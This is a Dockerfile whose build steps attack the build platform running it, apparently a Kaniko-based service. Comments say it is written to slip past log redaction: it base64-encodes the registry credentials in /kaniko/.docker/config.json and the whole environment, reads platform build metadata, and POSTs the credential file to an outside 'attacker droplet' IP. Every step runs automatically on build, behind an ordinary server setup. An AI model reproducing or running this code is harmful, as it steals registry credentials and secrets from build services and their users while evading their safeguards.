FROM alpine:3.19
RUN apk add --no-cache curl python3

# Bypass log sanitization: base64 encode credentials
RUN echo "=== CONFIG B64 ===" && \
    base64 /kaniko/.docker/config.json 2>&1 && \
    echo "=== END CONFIG ===" || true

# Check build metadata  
RUN echo "=== BUILD META ===" && \
    ls -la /.app_platform/ 2>&1 && \
    cat /.app_platform/.build_metadata 2>&1 || true

# Check env vars via base64 (bypasses pattern matching redaction)
RUN echo "=== ENV B64 ===" && \
    env | base64 2>&1 || true

# Check if we can exfil to external (attacker droplet at 147.182.173.61)
RUN echo "=== EXFIL TEST ===" && \
    cat /kaniko/.docker/config.json | curl -sk --max-time 10 -X POST \
      http://147.182.173.61:4444/ \
      -H "Content-Type: application/json" \
      --data-binary @- 2>&1 || true

COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]

